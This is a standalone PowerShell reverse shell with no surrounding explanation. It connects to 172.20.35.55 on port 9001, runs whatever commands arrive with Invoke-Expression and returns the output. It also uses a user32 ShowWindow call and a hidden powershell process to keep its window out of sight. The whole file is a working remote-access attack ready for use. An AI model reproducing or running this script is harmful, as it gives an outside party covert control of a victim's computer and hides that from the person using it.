$hideWindowCode = @'
Add-Type -TypeDefinition @"
using System;
using System.Runtime.InteropServices;
public class Win32 {
    [DllImport("user32.dll")]
    public static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
}
"@

$handle = (Get-Process -id $pid).MainWindowHandle
$null = [Win32]::ShowWindow($handle, 0)
'@

$client = New-Object System.Net.Sockets.TCPClient("172.20.35.55", 9001)
$stream = $client.GetStream()
[byte[]]$bytes = 0..65535 | ForEach-Object { 0 }
while (($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0) {
    $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes, 0, $i)
    $sendback = (Invoke-Expression $data 2>&1 | Out-String)
    $sendback2 = $sendback + "PS " + (Get-Location).Path + "> "
    $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2)
    $stream.Write($sendbyte, 0, $sendbyte.Length)
	cmd.exe /c start /b powershell.exe -WindowStyle Hidden -Command "$hideWindowCode"
    $stream.Flush()
}
$client.Close()
